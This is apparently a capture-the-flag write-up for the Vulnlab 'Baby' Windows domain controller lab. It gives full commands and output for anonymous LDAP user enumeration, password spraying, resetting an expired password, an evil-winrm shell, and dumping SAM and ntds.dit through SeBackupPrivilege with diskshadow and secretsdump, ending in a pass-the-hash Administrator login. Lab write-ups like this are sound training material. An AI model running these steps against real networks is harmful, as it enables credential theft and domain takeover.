+++
title = '[Vulnlab] Baby'
date = 2024-09-28T13:39:22+02:00
draft = false
tags = ['pentesting']
+++
[Proof](https://api.vulnlab.com/api/v1/share?id=5c1b2c58-7dd4-4ae3-ace9-8e143aae4f27)

# Summary
1. Anonymous LDAP access leaks usernames and password. 
2. Password spray with `netexec`
3. `smbpasswd` to reset password
4. `evil-winrm` to connect to Machine
>user.txt

5. Abuse `SEBackupPrivilege` to dump Admin hashes
>root.txt


## Tools used
```
netexec
smbpasswd
evil-winrm
impacket 
```

## Ports
```
389/tcp  open  ldap             # -> usernames and password
445/tcp  open  microsoft-ds     # -> passwordspray
5985/tcp open  wsman            # -> Code Execution with credentials
```
## Relevant Leaks
* Usernames gathered via anonymous LDAP access
* Password gathered via User description

# Walkthrough
## Basic Enumeration
Entering IP into ips.txt.
```bash
echo -n 10.10.64.114 > ips.txt
```

First, we figure out the domain:
```bash
nxc smb ips.txt
SMB         10.10.72.122    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
```

The domain is `baby.vl` → Add the following line to `/etc/hosts/`, so we can target the domain directly.
```bash
echo '10.10.64.114    baby.vl' | sudo tee -a /etc/hosts
```

The following scan reveals all relevant ports and finishes in 3 Minutes on my machine.
```
sudo nmap -p- -iL ips.txt -v -oA full
```

## 389 LDAP - Get username and password
### Misconfiguration: LDAP allows anonymous access → User enumeration
```bash
nxc ldap baby.vl -u '' -p '' --users | tee users.txt
SMB         10.10.64.114    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
LDAP        10.10.64.114    389    BABYDC           [+] baby.vl\: 
LDAP        10.10.64.114    389    BABYDC           [*] Total records returned: 39
LDAP        10.10.64.114    389    BABYDC           DC=baby,DC=vl
[...]
LDAP        10.10.64.114    389    BABYDC           CN=Joseph Hughes,OU=it,DC=baby,DC=vl
LDAP        10.10.64.114    389    BABYDC           CN=Kerry Wilson,OU=it,DC=baby,DC=vl
LDAP        10.10.64.114    389    BABYDC           CN=Teresa Bell,OU=it,DC=baby,DC=vl
LDAP        10.10.64.114    389    BABYDC           CN=******** ********,OU=it,DC=baby,DC=vl
```

We can generate a List of usernames by taking the names and replacing space with periods.
```bash
(cat users.txt | grep CN | cut -d= -f2 | cut -d, -f1 | tr ' ' '.' ) > tmp ; mv tmp users.txt
```

### CRITICAL Misconfiguration: Password stored in User Description

```bash {hl_lines=[5]}
nxc ldap baby.vl -u '' -p '' -M user-desc
SMB         10.10.64.114    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
LDAP        10.10.64.114    389    BABYDC           [+] baby.vl\: 
USER-DESC   10.10.64.114    389    BABYDC           
    User: Teresa.Bell - Description: Set initial password to **********
USER-DESC   10.10.64.114    389    BABYDC           Saved 2 user descriptions to /home/debian/.nxc/logs/UserDesc-10.10.64.114-20240928_141347.log
```
We now have the password `***********`.

## 445 SMB - Password spraying and Password reset
Password spraying time with `netexec`:
```bash
nxc smb baby.vl -u users.txt -p pass
[...]
SMB         10.10.64.114    445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.64.114    445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.64.114    445    BABYDC           [-] baby.vl\********.********:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
```

We found one user that has `STATUS_PASSWORD_MUST_CHANGE`. 
```
echo '********.********' > user
```

After googling we find the blog [Resetting an Expired Password Remotely](https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/) from `n00py` which lists various ways to reset a password.

Of those, we find that the tool `smbpasswd` works:
1. Use `apg` to generate New password
2. Overwrite new password
```bash
echo ******** > pass
```

```bash
smbpasswd -r baby.vl -U $(<user)
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user ********.********
```

## 5985 WinRM: Code execution
Since, [Windows Remote Management](https://learn.microsoft.com/en-us/windows/win32/winrm/portal?redirectedfrom=MSDN) is enabled on port 5985, we can get code execution.

First we check if the password is correct:
```bash
nxc winrm baby.vl -u user -p pass
WINRM       10.10.64.114    5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
WINRM       10.10.64.114    5985   BABYDC           [+] baby.vl\********:******** (Pwn3d!)
```

Then we get the flag vial `evil-winrm`
```bash
evil-winrm -u $(<user) -p $(<pass) -i baby.vl

Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\********\Documents> cd ..
*Evil-WinRM* PS C:\Users\********> cat Desktop\user.txt
VL{********************************}

```

## Misconfiguration: `SeBackupPrivilege` leads to Privilege Escalation

First we go through a list of possible quick wins:

```powershell {hl_lines=[9]}
*Evil-WinRM* PS C:\Users\*****************\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

`SeBackupPrivilege` allows a user to access any file on the system which means we can dump all hashes. 
The process is:
1. Upload a `script.txt` file which creates a backup of `ntds.dit`
2. Run a set of commands to create `sam` `system` and `ntds.dit`
3. Download those files and use `secretsdump.py` from `impacket` to get Hashes

Note that it is a lot faster to transfer files via `smbserver.py`. 
For the sake of brevity this write-up uses to inbuilt `upload` and `download` functions from `evil-winrm`


The `script.txt` file:
```
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

Run on Windows victim:
```powershell
upload script.txt # Me
reg save hklm\sam sam
reg save hklm\system system
diskshadow /s script.txt
robocopy /b E:\Windows\ntds . ntds.dit
download  ntds.dit
download sam
download system
```

On Host run `secretsdump.py` to load hashes
```bash {hl_lines=[15]}
secretsdump.py -sam sam -system system -ntds ntds.dit LOCAL 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                         
                                                                                                                              
[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88                                                                 
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)                                                                          
# These are not useful!
Administrator:500:aad3b435b51404eeaad3b435b51404ee:********************************:::        
Guest:501:aad3b435b51404eeaad3b435b51404ee:********************************:::               
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:********************************:::            
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                 
[*] Searching for pekList, be patient                                                                                         
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit                                                                               
Administrator:500:aad3b435b51404eeaad3b435b51404ee:********************************:::
[...]
```


Now we can log in as Administrator:
```bash
nxc smb baby.vl -u Administrator -H ********************************
SMB         10.10.92.227    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.92.227    445    BABYDC           [+] baby.vl\Administrator:******************************** (Pwn3d!)
```

```bash
evil-winrm -i baby.vl -u Administrator -H ********************************
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
VL{********************************}
```


